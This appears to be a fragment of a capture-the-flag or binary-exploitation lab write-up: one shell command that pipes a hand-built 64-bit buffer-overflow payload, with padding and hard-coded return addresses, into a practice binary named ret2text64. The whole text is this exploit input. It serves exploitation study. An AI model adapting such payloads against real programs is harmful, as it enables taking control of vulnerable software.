...
```shell
{ printf 'aaaaaaaa%.0s' {1..32};printf 'aaaaaaaa';printf '\x13\x13\x40\x00\x00\x00\x00\x00';printf '\xbd\xa5\xf7\xf7\xff\x7f\x00\x00';printf '\x1f\x12\x40\x00\x00\x00\x00\x00'; }|./ret2text64
```
